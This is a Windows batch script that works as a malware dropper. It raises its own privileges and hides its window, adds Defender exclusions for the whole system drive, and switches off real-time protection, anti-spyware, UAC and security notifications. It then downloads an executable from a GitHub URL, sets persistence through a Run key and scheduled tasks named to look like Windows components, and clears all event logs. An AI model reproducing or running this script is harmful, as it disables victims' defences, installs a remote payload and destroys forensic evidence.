@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
if "%1"=="hidden" goto :hidden
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\run_hidden.vbs"
echo WshShell.Run """" ^& WScript.Arguments(0) ^& """ hidden"", 0 >> "%temp%\run_hidden.vbs"
echo Set WshShell = Nothing >> "%temp%\run_hidden.vbs"
cscript //nologo "%temp%\run_hidden.vbs" "%~f0" hidden
del "%temp%\run_hidden.vbs"
exit /b
:hidden
powershell -windowstyle hidden Add-MpPreference -ExclusionPath "%systemdrive%"
powershell Add-MpPreference -ExclusionPath "c:\"
powershell Add-MpPreference -ExclusionPath "%tmp%"
powershell Add-MpPreference -ExclusionPath "%appdata%"
powershell Add-MpPreference -ExclusionPath "%systemdrive%\programdata\Windata"
powershell Add-MpPreference -ExclusionProcess "powershell.exe"
powershell Add-MpPreference -ExclusionPath "C:\ProgramData\GG-Win"

reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

cls
mkdir "%systemdrive%\programdata\GG-Win"

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/WindowsExplorer.exe','%programdata%\GG-Win\WindowsExplorer.exe')"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
start "" "%programdata%\GG-Win\WindowsExplorer.exe"
copy "%TEMP%\WindowsExplorer.bat" "%ProgramData%\GG-Win\WindowsExplorer.bat" /Y
schtasks /create /tn WindowsExplorer /ru "%username%" /sc minute /mo 45 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.bat" /f
powershell -WindowStyle Hidden -Command "if (-not (Get-Process -Name 'WindowsExplorer' -ErrorAction SilentlyContinue)) {Start-Process '%ProgramData%\GG-Win\WindowsExplorer.exe' -WindowStyle Hidden}"
for /F "tokens=*" %%i in ('wevtutil.exe el') DO wevtutil.exe cl "%%i"
